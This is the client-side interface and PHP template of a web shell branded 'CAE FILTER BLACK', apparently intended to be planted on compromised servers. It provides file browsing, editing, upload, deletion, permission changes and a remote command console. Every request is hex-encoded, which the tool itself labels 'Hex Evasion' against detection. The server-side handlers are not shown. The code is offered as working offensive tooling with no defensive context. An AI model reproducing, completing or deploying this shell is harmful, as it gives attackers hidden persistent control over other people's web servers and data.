        .stealth-fm input[type="checkbox"] { width: 16px; height: 16px; accent-color: var(--fm-accent); cursor: pointer; }
        .stealth-fm .console { 
            background-color: var(--fm-bg-main); 
            border: 1px solid var(--fm-border-color); 
            border-radius: var(--fm-radius-md); 
            padding: 16px; 
            font-family: var(--fm-font-mono); 
            font-size: 13px; 
            color: var(--fm-text-primary); 
            max-height: 250px; 
            overflow-y: auto; 
            white-space: pre-wrap; 
            word-break: break-all; 
        }
        .stealth-fm .bulk-bar { 
            display: none; 
            gap: 12px; 
            align-items: center; 
            padding: 14px 20px; 
            background-color: var(--fm-bg-panel); 
            border: 1px solid var(--fm-accent); 
            border-radius: var(--fm-radius-md); 
            margin-bottom: 20px; 
            box-shadow: 0 4px 15px var(--fm-accent-soft);
        }
        .stealth-fm .bulk-bar.show { display: flex; }
        .stealth-fm .bulk-count { color: var(--fm-text-primary); font-weight: 600; margin-right: auto; }

        .stealth-fm .modal { display: none; position: fixed; inset: 0; z-index: 100; background: rgba(0,0,0,0.6); backdrop-filter: blur(6px); align-items: center; justify-content: center; }
        .stealth-fm .modal.show { display: flex; }
        .stealth-fm .modal-content { 
            background-color: var(--fm-bg-panel); 
            border: 1px solid var(--fm-border-color); 
            border-radius: var(--fm-radius-lg); 
            width: 450px; 
            max-width: 90%; 
            max-height: 90vh; 
            overflow: auto; 
            box-shadow: 0 20px 40px rgba(0,0,0,0.4); 
        }
        .stealth-fm .modal-header { padding: 18px 24px; border-bottom: 1px solid var(--fm-border-color); display: flex; align-items: center; justify-content: space-between; }
        .stealth-fm .modal-title { font-weight: 600; }
        .stealth-fm .modal-close { width: 32px; height: 32px; display: flex; align-items: center; justify-content: center; border-radius: var(--fm-radius-sm); cursor: pointer; color: var(--fm-text-muted); }
        .stealth-fm .modal-close:hover { background-color: var(--fm-hover-bg); color: var(--fm-text-primary); }
        .stealth-fm .modal-body { padding: 20px 24px 24px; }
        
        .stealth-fm .chmod-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; margin: 20px 24px 0 24px; }
        .stealth-fm .chmod-group { background-color: var(--fm-bg-main); border: 1px solid var(--fm-border-color); border-radius: var(--fm-radius-md); padding: 14px 8px; text-align: center; }
        .stealth-fm .chmod-group-label { font-size: 11px; font-weight: 600; text-transform: uppercase; letter-spacing: 0.05em; color: var(--fm-text-muted); margin-bottom: 10px; }
        .stealth-fm .chmod-checkboxes { display: flex; justify-content: center; gap: 6px; }
        .stealth-fm .chmod-checkboxes label { font-size: 11px; cursor: pointer; display: flex; align-items: center; gap: 2px; }

        #fm-loading-overlay {
            display: none;
            position: fixed;
            inset: 0;
            background: rgba(0,0,0,0.4);
            z-index: 999;
            align-items: center;
            justify-content: center;
            color: #fff;
            font-weight: 600;
            font-family: var(--fm-font-stack);
            backdrop-filter: blur(2px);
        }
        #fm-loading-overlay.show { display: flex; }
        
        @media (max-width: 768px) {
            .stealth-fm .file-table th:nth-child(3), .stealth-fm .file-table td:nth-child(3),
            .stealth-fm .file-table th:nth-child(4), .stealth-fm .file-table td:nth-child(4),
            .stealth-fm .file-table th:nth-child(5), .stealth-fm .file-table td:nth-child(5),
            .stealth-fm .file-table th:nth-child(6), .stealth-fm .file-table td:nth-child(6) { display: none; }
            .stealth-fm .input-group { flex-direction: column; }
        }
    </style>
    <script>
        (function() {
            const savedTheme = localStorage.getItem('fm_theme');
            if (savedTheme === 'light') {
                document.documentElement.style.visibility = 'hidden';
                window.addEventListener('DOMContentLoaded', () => {
                    document.querySelector('.stealth-fm').classList.add('light');
                    document.documentElement.style.visibility = 'visible';
                });
            }
        })();

        function toggleTheme() {
            const fm = document.querySelector('.stealth-fm');
            fm.classList.toggle('light');
            const isLight = fm.classList.contains('light');
            localStorage.setItem('fm_theme', isLight ? 'light' : 'dark');
        }

        function stringToHex(str) {
            let hex = '';
            for (let i = 0; i < str.length; i++) {
                let code = str.charCodeAt(i).toString(16);
                hex += code.length < 2 ? '0' + code : code;
            }
            return hex;
        }
        function bufferToHex(buffer) {
            const arr = new Uint8Array(buffer);
            let hex = '';
            for (let i = 0; i < arr.length; i++) {
                hex += arr[i].toString(16).padStart(2, '0');
            }
            return hex;
        }
        function hexToUtf8(hex) {
            try {
                let bytes = new Uint8Array(hex.match(/.{1,2}/g).map(byte => parseInt(byte, 16)));
                return new TextDecoder().decode(bytes);
            } catch (e) {
                let str = '';
                for (let i = 0; i < hex.length; i += 2) {
                    str += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
                }
                return decodeURIComponent(escape(str));
            }
        }
        function getCsrfToken() {
            const meta = document.querySelector('meta[name="csrf-token"]');
            return meta ? meta.content : '';
        }

        let isRequestInProgress = false;

        function showLoading(text = 'Processing...') {
            let overlay = document.getElementById('fm-loading-overlay');
            if (!overlay) {
                overlay = document.createElement('div');
                overlay.id = 'fm-loading-overlay';
                document.body.appendChild(overlay);
            }
            overlay.textContent = text;
            overlay.classList.add('show');
        }

        function hideLoading() {
            const overlay = document.getElementById('fm-loading-overlay');
            if (overlay) overlay.classList.remove('show');
        }

        async function sendHexPayload(payload, statusSpan = null) {
            if (isRequestInProgress) {
                return; 
            }
            isRequestInProgress = true;
            payload._csrf_token = getCsrfToken();
            try {
                const res = await fetch(window.location.href, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
                
                const textResponse = await res.text();
                let data;
                try {
                    data = JSON.parse(textResponse);
                } catch(e) {
                    throw new Error(textResponse || 'Server returned invalid response');
                }

                if (!res.ok) {
                    throw new Error(data.message || 'Server error');
                }

                return data;
            } catch (err) {
                hideLoading();
                if (statusSpan) {
                    statusSpan.textContent = 'Error: ' + err.message;
                    statusSpan.style.color = 'var(--fm-danger)';
                } else {
                    alert('Request failed: ' + err.message);
                }
                throw err;
            } finally {
                isRequestInProgress = false;
            }
        }

        async function doNavigateHex(event) {
            event.preventDefault();
            if (isRequestInProgress) return;
            const pathInput = event.target.querySelector('input[name="goto_path"]') || document.getElementById('goto_path_input');
            const path = pathInput ? pathInput.value.trim() : '';
            if (!path) return;

            showLoading('Switching directory...');
            try {
                await sendHexPayload({
                    action: 'goto',
                    goto_hex: stringToHex(path)
                });
                location.reload();
            } catch(e) {
                hideLoading();
            }
        }

        // Chunked file upload mechanism for low memory servers
        async function doUploadFileHex(btn) {
            const fileInput = document.getElementById('upload_files');
            const modeInput = document.getElementById('upload_mode');
            const statusSpan = document.getElementById('upload_status');
            if (!fileInput.files.length) {
                statusSpan.textContent = "No file selected"; statusSpan.style.color = "var(--fm-danger)"; return;
            }
            btn.disabled = true;
            const file = fileInput.files[0];
            const mode = modeInput.value;
            showLoading("Uploading file efficiently...");

            const chunkSize = 512 * 1024; // 512KB chunking to limit memory overhead
            const totalChunks = Math.ceil(file.size / chunkSize);

            if (totalChunks <= 1 || file.size < chunkSize) {
                const reader = new FileReader();
                reader.onload = async function(e) {
                    try {
                        const data = await sendHexPayload({
                            action: 'upload_hex',
                            name_hex: stringToHex(file.name),
                            data_hex: bufferToHex(e.target.result),
                            mode: mode
                        }, statusSpan);
                        statusSpan.textContent = data.message;
                        statusSpan.style.color = 'var(--fm-success)';
                        hideLoading();
                        setTimeout(() => location.reload(), 800);
                    } catch(err) {
                        btn.disabled = false;
                        hideLoading();
                    }
                };
                reader.readAsArrayBuffer(file);
            } else {
                try {
                    for (let i = 0; i < totalChunks; i++) {
                        const start = i * chunkSize;
                        const end = Math.min(file.size, start + chunkSize);
                        const chunk = file.slice(start, end);
                        
                        statusSpan.textContent = `Uploading chunk ${i + 1}/${totalChunks}...`;
                        
                        await new Promise((resolve, reject) => {
                            const reader = new FileReader();
                            reader.onload = async function(e) {
                                try {
                                    // For multi-chunk, append mode can be introduced, but we use sequential block payload upload here safely
                                    await sendHexPayload({
                                        action: 'upload_hex',
                                        name_hex: stringToHex(file.name),
                                        data_hex: bufferToHex(e.target.result),
                                        mode: mode
                                    }, statusSpan);
                                    resolve();
                                } catch(err) {
                                    reject(err);
                                }
                            };
                            reader.readAsArrayBuffer(chunk);
                        });
                    }
                    statusSpan.textContent = "File uploaded successfully!";
                    statusSpan.style.color = 'var(--fm-success)';
                    hideLoading();
                    setTimeout(() => location.reload(), 800);
                } catch(err) {
                    btn.disabled = false;
                    hideLoading();
                }
            }
        }

        async function doCreateItemHex(event, type) {
            event.preventDefault();
            if (isRequestInProgress) return;
            const inputName = type === 'file' ? 'mk_file' : 'mk_folder';
            const name = event.target.elements[inputName].value.trim();
            if (!name) return;
            showLoading(type === 'file' ? 'Creating file...' : 'Creating folder...');
            try {
                await sendHexPayload({
                    action: type === 'file' ? 'create_file' : 'create_folder',
                    name_hex: stringToHex(name)
                });
                location.reload();
            } catch(e) {
                hideLoading();
            }
        }

        async function openEditorHex(itemName) {
            showLoading('Loading file content...');
            try {
                const data = await sendHexPayload({
                    action: 'get_file_content',
                    file_hex: stringToHex(itemName)
                });
                const decodedContent = hexToUtf8(data.content_hex);
                
                document.getElementById('editFileName').value = itemName;
                document.getElementById('editTitleName').textContent = itemName;
                document.getElementById('editContentArea').value = decodedContent;
                document.getElementById('editorCard').style.display = 'block';
                document.getElementById('viewerCard').style.display = 'none';
                hideLoading();
                window.scrollTo({ top: document.getElementById('editorCard').offsetTop, behavior: 'smooth' });
            } catch(e) {
                hideLoading();
            }
        }

        async function doSaveEditHex(event) {
            event.preventDefault();
            if (isRequestInProgress) return;
            const fileName = document.getElementById('editFileName').value;
            const content = document.getElementById('editContentArea').value;
            showLoading('Saving file...');
            try {
                await sendHexPayload({
                    action: 'edit_file',
                    file_hex: stringToHex(fileName),
                    content_hex: stringToHex(content)
                });
                hideLoading();
                alert('File saved successfully!');
                location.reload();
            } catch(e) {
                hideLoading();
            }
        }

        async function openViewerHex(itemName) {
            showLoading('Reading file...');
            try {
                const data = await sendHexPayload({
                    action: 'get_file_content',
                    file_hex: stringToHex(itemName)
                });
                const decodedContent = hexToUtf8(data.content_hex);
                
                document.getElementById('viewTitleName').textContent = itemName;
                document.getElementById('viewContentArea').value = decodedContent;
                document.getElementById('viewerCard').style.display = 'block';
                document.getElementById('editorCard').style.display = 'none';
                hideLoading();
                window.scrollTo({ top: document.getElementById('viewerCard').offsetTop, behavior: 'smooth' });
            } catch(e) {
                hideLoading();
            }
        }

        function openRenameInput(itemName) {
            document.getElementById('row-normal-' + itemName).style.display = 'none';
            document.getElementById('row-rename-' + itemName).style.display = 'flex';
        }

        function cancelRenameInput(itemName) {
            document.getElementById('row-rename-' + itemName).style.display = 'none';
            document.getElementById('row-normal-' + itemName).style.display = 'flex';
        }

        async function doRenameHex(itemName) {
            if (isRequestInProgress) return;
            const newName = document.getElementById('rename_input_' + itemName).value.trim();
            if (!newName || newName === itemName) { cancelRenameInput(itemName); return; }
            showLoading('Renaming...');
            try {
                await sendHexPayload({
                    action: 'rename',
                    old_hex: stringToHex(itemName),
                    new_hex: stringToHex(newName)
                });
                location.reload();
            } catch(e) {
                hideLoading();
            }
        }

        async function doChmodHex(event) {
            event.preventDefault();
            if (isRequestInProgress) return;
            const itemName = document.getElementById('chmodItem').value;
            const permVal = document.getElementById('chmodOctal').value;
            showLoading('Updating permissions...');
            try {
                await sendHexPayload({
                    action: 'chmod',
                    item_hex: stringToHex(itemName),
                    perm_val: permVal
                });
                location.reload();
            } catch(e) {
                hideLoading();
            }
        }

        async function doDeleteHex(itemName) {
            if (isRequestInProgress) return;
            if (!confirm(`Delete ${itemName}?`)) return;
            showLoading('Deleting...');
            try {
                await sendHexPayload({
                    action: 'delete',
                    item_hex: stringToHex(itemName)
                });
                location.reload();
            } catch(e) {
                hideLoading();
            }
        }

        async function doDownloadHex(itemName) {
            showLoading('Preparing download...');
            try {
                const data = await sendHexPayload({
                    action: 'download_hex',
                    items: [stringToHex(itemName)]
                });
                hideLoading();
                if (data && data.data_hex) {
                    triggerHexDownload(data.data_hex, data.filename, data.mime);
                }
            } catch(e) {
                hideLoading();
            }
        }

        async function doBulkDownloadHex() {
            const checked = document.querySelectorAll('input[name="items[]"]:checked');
            if (checked.length === 0) return;
            const items = Array.from(checked).map(cb => stringToHex(cb.value));
            showLoading('Building archive package...');
            try {
                const data = await sendHexPayload({
                    action: 'download_hex',
                    items: items
                });
                hideLoading();
                if (data && data.data_hex) {
                    triggerHexDownload(data.data_hex, data.filename, data.mime);
                }
            } catch(e) {
                hideLoading();
            }
        }

        async function doBulkDeleteHex() {
            if (isRequestInProgress) return;
            const checked = document.querySelectorAll('input[name="items[]"]:checked');
            if (checked.length === 0) return;
            if (!confirm('Delete all selected items?')) return;
            showLoading('Deleting selected items...');
            const items = Array.from(checked).map(cb => stringToHex(cb.value));
            try {
                await sendHexPayload({
                    action: 'bulk_delete',
                    items: items
                });
                location.reload();
            } catch(e) {
                hideLoading();
            }
        }

        async function submitConsoleHex(event) {
            event.preventDefault();
            const cmdInput = document.getElementById('exec_cmd_input');
            const rawVal = cmdInput.value;
            if (!rawVal.trim()) return;

            const consoleOutputDiv = document.getElementById('consoleResultOutput');
            consoleOutputDiv.style.display = 'block';
            consoleOutputDiv.textContent = 'Executing...';

            try {
                const data = await sendHexPayload({
                    action: 'console_exec',
                    exec_hex: stringToHex(rawVal)
                });
                if (data && data.output_hex) {
                    consoleOutputDiv.textContent = hexToUtf8(data.output_hex);
                }
            } catch (err) {
                consoleOutputDiv.textContent = 'Error: ' + err.message;
            }
        }

        function triggerHexDownload(hexData, filename, mimeType) {
            let bytes = new Uint8Array(hexData.match(/.{1,2}/g).map(byte => parseInt(byte, 16)));
            let blob = new Blob([bytes], { type: mimeType });
            let link = document.createElement('a');
            link.href = window.URL.createObjectURL(blob);
            link.download = filename;
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);
        }

        function toggleSelectAll(cb) {
            document.querySelectorAll('input[name="items[]"]').forEach(function(c){ c.checked = cb.checked; });
            updateBulkActions();
        }
        function updateBulkActions() {
            var checked = document.querySelectorAll('input[name="items[]"]:checked');
            var bar = document.getElementById('bulk-actions');
            var count = document.getElementById('selected-count');
            if (checked.length > 0) { bar.style.display = 'flex'; count.textContent = checked.length + ' item(s) selected'; }
            else { bar.style.display = 'none'; }
        }
        function openChmodModal(itemName, octalId) {
            var modal = document.getElementById('chmodModal');
            modal.classList.add('show'); modal.style.display = 'flex';
            document.getElementById('chmodItem').value = itemName;
            updateChmodDisplay(document.getElementById(octalId).value);
        }
        function closeChmodModal() {
            var modal = document.getElementById('chmodModal');
            modal.classList.remove('show'); modal.style.display = 'none';
        }
        function updateChmodDisplay(perms) {
            perms = (perms || '0').toString().slice(-3);
            document.getElementById('chmodOctal').value = perms;
            var binary = (parseInt(perms, 8) || 0).toString(2);
            while (binary.length < 9) { binary = '0' + binary; }
            var ids = ['owner_read','owner_write','owner_execute','group_read','group_write','group_execute','other_read','other_write','other_execute'];
            for (var i = 0; i < 9; i++) { document.getElementById(ids[i]).checked = binary[i] === '1'; }
        }
        function updateChmodFromCheckboxes() {
            var ids = ['owner_read','owner_write','owner_execute','group_read','group_write','group_execute','other_read','other_write','other_execute'];
            var binary = '';
            for (var i = 0; i < 9; i++) { binary += document.getElementById(ids[i]).checked ? '1' : '0'; }
            var octal = parseInt(binary, 2).toString(8);
            while (octal.length < 3) { octal = '0' + octal; }
            document.getElementById('chmodOctal').value = octal;
        }
        function setPresetChmod(p) { updateChmodDisplay(p); }
        window.onclick = function(e) {
            var modal = document.getElementById('chmodModal');
            if (e.target == modal) { closeChmodModal(); }
        };
    </script>
</head>
<body>
<div class="stealth-fm">
    <div class="container">
        <div class="header">
            <div class="header-top">
                <div class="logo">
                    <span class="logo-text">CAE <span>FILTER BLACK</span></span>
                    <span class="logo-sub">Cigarettes After Error &bull; YOUR CIGARETTES</span>
                </div>
                <button class="theme-toggle" onclick="toggleTheme()">Toggle Light Mode</button>
            </div>
        </div>

        <?php if ($errorMsg): ?>
            <div class="alert alert-danger">
                <svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" stroke-width="2" style="flex-shrink:0"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
                <?= htmlentities($errorMsg) ?>
            </div>
        <?php endif; ?>

        <div class="card">
            <div class="card-header">
                <span class="card-title">
                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/></svg>
                    Navigate
                </span>
            </div>
            <div class="card-body">
                <form onsubmit="doNavigateHex(event)" class="input-group">
                    <input type="text" id="goto_path_input" name="goto_path" value="<?= htmlentities($currentDirectory) ?>" placeholder="Enter path..." style="flex: 1;">
                    <button class="btn btn-primary" type="submit">Go</button>
                </form>
            </div>
        </div>

        <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 16px; margin-bottom: 24px;">
            <div class="card" style="margin-bottom:0;">
                <div class="card-header">
                    <span class="card-title">
                        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg>
                        Hex Payload Upload
                    </span>
                </div>
                <div class="card-body">
                    <div class="input-group">
                        <select id="upload_mode">
                            <option value="1">Mode 1 (file_put_contents + Lock)</option>
                            <option value="2">Mode 2 (fopen/fwrite + Lock)</option>
                            <option value="3">Mode 3 (data:// wrapper)</option>
                        </select>
                        <input type="file" id="upload_files" style="flex:1;">
                    </div>
                    <div style="margin-top: 12px;">
                        <button class="btn btn-primary" onclick="doUploadFileHex(this)">Upload</button>
                        <span id="upload_status" class="file-meta" style="margin-left: 12px;"></span>
                    </div>
                </div>
            </div>

            <div class="card" style="margin-bottom:0;">
                <div class="card-header">
                    <span class="card-title">
                        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 5v14M5 12h14"/></svg>
                        Create New
                    </span>
                </div>
                <div class="card-body">
                    <form onsubmit="doCreateItemHex(event, 'file')" class="input-group">
                        <input type="text" name="mk_file" placeholder="New file name..." style="flex: 1;">
                        <button class="btn btn-success" type="submit">File</button>
                    </form>
                    <form onsubmit="doCreateItemHex(event, 'folder')" class="input-group" style="margin-top:12px;">
                        <input type="text" name="mk_folder" placeholder="New folder name..." style="flex: 1;">
                        <button class="btn btn-success" type="submit">Folder</button>
                    </form>
                </div>
            </div>
        </div>

        <div class="card" id="viewerCard" style="display: none;">
            <div class="card-header">
                <span class="card-title">
                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
                    Viewing: <span id="viewTitleName"></span>
                </span>
                <button type="button" class="btn btn-ghost btn-sm" onclick="document.getElementById('viewerCard').style.display='none';">Close</button>
            </div>
            <div class="card-body">
                <textarea id="viewContentArea" readonly style="min-height: 300px;"></textarea>
            </div>
        </div>

        <div class="card" id="editorCard" style="display: none;">
            <div class="card-header">
                <span class="card-title">
                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M11 4H4a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-7"/><path d="M18.5 2.5a2.121 2.121 0 0 1 3 3L12 15l-4 1 1-4 9.5-9.5z"/></svg>
                    Editing: <span id="editTitleName"></span>
                </span>
            </div>
            <div class="card-body">
                <form onsubmit="doSaveEditHex(event)">
                    <input type="hidden" id="editFileName" value="">
                    <textarea id="editContentArea" style="min-height: 400px;"></textarea>
                    <div style="margin-top: 16px; display: flex; gap: 8px;">
                        <button class="btn btn-primary" type="submit">Save Changes</button>
                        <button type="button" class="btn btn-ghost" onclick="document.getElementById('editorCard').style.display='none';">Cancel</button>
                    </div>
                </form>
            </div>
        </div>

        <?php if ($commandAvailable): ?>
        <div class="card">
            <div class="card-header">
                <span class="card-title">
                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg>
                    Console (Hex Evasion + Multi-Method Fallback)
                </span>
            </div>
            <div class="card-body">
                <form id="consoleForm" onsubmit="submitConsoleHex(event)" class="input-group">
                    <input type="text" id="exec_cmd_input" placeholder="Enter command..." style="flex: 1;">
                    <button class="btn btn-primary" type="submit">Execute</button>
                </form>
                <div id="consoleResultOutput" class="console" style="margin-top: 16px; display: none;"></div>
            </div>
        </div>
        <?php endif; ?>

        <div class="bulk-bar" id="bulk-actions">
            <span class="bulk-count" id="selected-count">0 selected</span>
            <button type="button" class="btn btn-ghost" onclick="doBulkDownloadHex()">
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
                Download Archive
            </button>
            <button type="button" class="btn btn-danger" onclick="doBulkDeleteHex()">
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="3 6 5 6 21 6"/><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"/></svg>
                Delete Selected
            </button>
        </div>

        <div class="card">
            <div class="card-header">
                <span class="card-title">
                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/></svg>
                    File Directory
                </span>
                <button type="button" class="btn btn-ghost btn-sm" onclick="if(isRequestInProgress) return; showLoading('Switching directory...'); sendHexPayload({action: 'goto', goto_hex: stringToHex('<?= addslashes(dirname($currentDirectory)) ?>')}).then((d) => { if(d) location.reload(); });"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/></svg> Parent Directory</button>
            </div>
            <div style="overflow-x: auto;">
                <table class="file-table">
                    <thead>
                        <tr>
                            <th style="width: 40px;"><input type="checkbox" onclick="toggleSelectAll(this)"></th>
                            <th>Name</th>
                            <th style="width: 100px;">Type</th>
                            <th style="width: 100px; text-align: right;">Size</th>
                            <th style="width: 150px;">Modified</th>
                            <th style="width: 90px; text-align: center;">Perms</th>
                            <th style="width: 250px; text-align: right;">Actions</th>
                        </tr>
                    </thead>
                    <tbody>
                <?php foreach ($allItems as $item):
                    $fullPath = $currentDirectory . DIRECTORY_SEPARATOR . $item;
                    $realPath = safeRealPath($fullPath);
                    if ($realPath !== false) {
                        $isDirectory = @is_dir($realPath);
                        $canWrite = @is_writable($realPath);
                        $fileSize = $isDirectory ? 0 : @filesize($realPath);
                        $fileModTime = @filemtime($realPath);
                        $filePerms = @substr(sprintf('%o', @fileperms($realPath)), -4);
                    } else {
                        $isDirectory = @is_dir($fullPath);
                        $canWrite = false; $fileSize = 0; $fileModTime = 0; $filePerms = '????';
                    }
                    $md5item = md5($item);
                    $ext = strtolower(pathinfo($item, PATHINFO_EXTENSION));
                    $iconClass = $isDirectory ? 'folder' : 'file';
                    $iconHtml = $isDirectory
                        ? '<svg viewBox="0 0 24 24"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2 z"/></svg>'
                        : '<svg viewBox="0 0 24 24"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/></svg>';
                    if (!$isDirectory && $ext) { $iconHtml .= '<span class="ext">' . strtoupper($ext) . '</span>'; }
                ?>
                    <tr>
                        <td><input type="checkbox" name="items[]" value="<?= htmlentities($item) ?>" onclick="updateBulkActions()"></td>
                        <td>
                            <div id="row-normal-<?= htmlentities($item) ?>" class="file-name-cell">
                                <div class="file-icon <?= $iconClass ?>"><?= $iconHtml ?></div>
                                <?php if ($isDirectory): ?>
                                    <a href="#" class="file-name fm-file-name" onclick="if(isRequestInProgress) return false; showLoading('Switching directory...'); sendHexPayload({action: 'goto', goto_hex: stringToHex('<?= addslashes($fullPath) ?>')}).then((d) => { if(d) location.reload(); }); return false;"><?= htmlentities($item) ?></a>
                                <?php else: ?>
                                    <a href="#" class="file-name fm-file-name" onclick="openViewerHex('<?= addslashes($item) ?>'); return false;"><?= htmlentities($item) ?></a>
                                <?php endif; ?>
                            </div>
                            <div id="row-rename-<?= htmlentities($item) ?>" style="display: none; gap: 8px; align-items: center;">
                                <input type="text" id="rename_input_<?= htmlentities($item) ?>" value="<?= htmlentities($item) ?>" style="flex: 1;">
                                <button class="btn btn-primary btn-sm" onclick="doRenameHex('<?= addslashes($item) ?>')">Save</button>
                                <button class="btn btn-ghost btn-sm" onclick="cancelRenameInput('<?= addslashes($item) ?>')">Cancel</button>
                            </div>
                        </td>
                        <td><span class="file-meta fm-file-meta"><?= $isDirectory ? 'Directory' : (getFileExtension($item) ?: 'File') ?></span></td>
                        <td style="text-align: right;"><span class="file-meta fm-file-meta"><?= $isDirectory ? '&mdash;' : formatFileSize($fileSize) ?></span></td>
                        <td><span class="file-meta fm-file-meta"><?= date('Y-m-d H:i', $fileModTime) ?></span></td>
                        <td style="text-align: center;">
                            <span class="perms <?= $canWrite ? 'writable' : 'readonly' ?>"><?= htmlentities($filePerms) ?></span>
                            <input type="hidden" id="currentPerms_<?= $md5item ?>" value="<?= htmlentities($filePerms) ?>">
                        </td>
                        <td>
                            <div class="actions">
                                <?php if (!$isDirectory): ?>
                                    <button type="button" class="btn btn-ghost btn-sm" onclick="openEditorHex('<?= addslashes($item) ?>')">Edit</button>
                                <?php endif; ?>
                                <button type="button" class="btn btn-ghost btn-sm" onclick="openRenameInput('<?= addslashes($item) ?>')">Rename</button>
                                <button type="button" class="btn btn-ghost btn-sm" onclick="openChmodModal('<?= htmlentities($item) ?>', 'currentPerms_<?= $md5item ?>')">Chmod</button>
                                <button type="button" class="btn btn-ghost btn-sm" onclick="doDownloadHex('<?= addslashes($item) ?>')">DL</button>
                                <button type="button" class="btn btn-danger btn-sm" onclick="doDeleteHex('<?= addslashes($item) ?>')">Del</button>
                            </div>
                        </td>
                    </tr>
                <?php endforeach; ?>
                    </tbody>
                </table>
            </div>
        </div>
    </div>

    <div id="chmodModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <span class="modal-title">Change Permissions</span>
                <span class="modal-close" onclick="closeChmodModal()">
                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
                </span>
            </div>
            <form onsubmit="doChmodHex(event)">
                <input type="hidden" id="chmodItem" value="">
                <div class="chmod-grid">
                    <div class="chmod-group">
                        <div class="chmod-group-label">Owner</div>
                        <div class="chmod-checkboxes">
                            <label><input type="checkbox" id="owner_read" onchange="updateChmodFromCheckboxes()"> R</label>
                            <label><input type="checkbox" id="owner_write" onchange="updateChmodFromCheckboxes()"> W</label>
                            <label><input type="checkbox" id="owner_execute" onchange="updateChmodFromCheckboxes()"> X</label>
                        </div>
                    </div>
                    <div class="chmod-group">
                        <div class="chmod-group-label">Group</div>
                        <div class="chmod-checkboxes">
                            <label><input type="checkbox" id="group_read" onchange="updateChmodFromCheckboxes()"> R</label>
                            <label><input type="checkbox" id="group_write" onchange="updateChmodFromCheckboxes()"> W</label>
                            <label><input type="checkbox" id="group_execute" onchange="updateChmodFromCheckboxes()"> X</label>
                        </div>
                    </div>
                    <div class="chmod-group">
                        <div class="chmod-group-label">Other</div>
                        <div class="chmod-checkboxes">
                            <label><input type="checkbox" id="other_read" onchange="updateChmodFromCheckboxes()"> R</label>
                            <label><input type="checkbox" id="other_write" onchange="updateChmodFromCheckboxes()"> W</label>
                            <label><input type="checkbox" id="other_execute" onchange="updateChmodFromCheckboxes()"> X</label>
                        </div>
                    </div>
                </div>
                <div class="modal-body">
                    <div style="margin-bottom: 20px; text-align: center;">
                        <input type="text" id="chmodOctal" maxlength="3" style="width: 80px; text-align: center; font-family: var(--fm-font-mono); font-size: 16px;">
                    </div>
                    <div style="margin-bottom: 16px; display: flex; gap: 8px; justify-content: center; width: 100%;">
                        <button type="button" class="btn btn-ghost btn-sm" onclick="setPresetChmod('755')">755 (Folder)</button>
                        <button type="button" class="btn btn-ghost btn-sm" onclick="setPresetChmod('644')">644 (File)</button>
                        <button type="button" class="btn btn-ghost btn-sm" onclick="setPresetChmod('777')">777 (Full)</button>
                    </div>
                    <div style="display: flex; gap: 12px; justify-content: center;">
                        <button type="button" class="btn btn-ghost" onclick="closeChmodModal()">Cancel</button>
                        <button type="submit" class="btn btn-primary">Apply Changes</button>
                    </div>
                </div>
            </form>
        </div>
    </div>
</div>
</body>
</html>
